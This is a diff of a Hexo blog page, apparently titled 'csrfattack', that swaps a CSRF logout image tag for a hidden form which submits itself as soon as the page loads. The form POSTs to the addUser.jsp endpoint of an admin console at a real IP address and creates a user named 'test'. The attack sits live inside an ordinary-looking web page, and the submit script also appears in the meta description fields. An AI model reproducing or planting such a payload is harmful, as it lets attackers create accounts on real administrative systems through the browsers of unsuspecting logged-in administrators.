@@ -35,17 +35,16 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description">
+<meta name="description" content="document.csrf.submit();">
 <meta property="og:type" content="website">
 <meta property="og:title" content="FengGe">
 <meta property="og:url" content="http://yoursite.com/csrfattack.html">
 <meta property="og:site_name" content="FengGe">
-<meta property="og:description">
-<meta property="og:image" content="http://202.84.17.159/ids/admin/logout.jsp">
-<meta property="og:updated_time" content="2015-09-11T07:27:15.741Z">
+<meta property="og:description" content="document.csrf.submit();">
+<meta property="og:updated_time" content="2015-09-11T07:41:38.028Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="FengGe">
-<meta name="twitter:description">
+<meta name="twitter:description" content="document.csrf.submit();">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -191,7 +190,17 @@
   <div id="posts" class="posts-expand">
     
     
-      <img src="http://202.84.17.159/ids/admin/logout.jsp"> 
+      
+
+<form name="csrf" action="http://202.84.17.159/ids/admin/user/addUser.jsp?groupName=" method="POST">
+	<input maxlength="40" size="20" name="userName" id="userName" value="test">
+	<input id="designPwdType" name="designPwdType" value="special" onclick="javascript:selectPwdGenType(false);doIntensityValidate('userName','newPassword','/ids/admin/userhome/pwdCheck.jsp');" onkeyup="setFocus(event)" type="radio">
+	<input id="nickName" name="nickName" value="" type="text">
+	<input id="submitBtn" name="bSubmit" value="添加" type="submit">
+</form>
+<script>
+	document.csrf.submit();
+</script>
     
   </div>
 
